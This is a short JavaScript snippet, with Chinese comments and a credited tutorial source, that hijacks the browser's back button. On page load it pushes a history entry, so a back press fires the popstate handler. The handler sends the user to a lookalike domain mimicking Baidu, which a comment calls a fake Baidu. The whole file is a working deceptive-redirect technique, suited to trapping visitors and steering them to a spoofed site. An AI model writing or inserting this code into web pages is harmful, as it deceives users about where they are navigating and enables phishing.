/**
 * 通过回退劫持用户
 * from: https://www.w3ctech.com/topic/1960
 */

window.onload=function(){
    //用于捕获浏览器回退事件1，或手机回退的物理按键
    history.pushState(null,null,null);
    window.onpopstate=function(){
      //当用户点击后退时，进入假百度
      location.replace("https://baidu.com-search.xxx.com");
    }
};

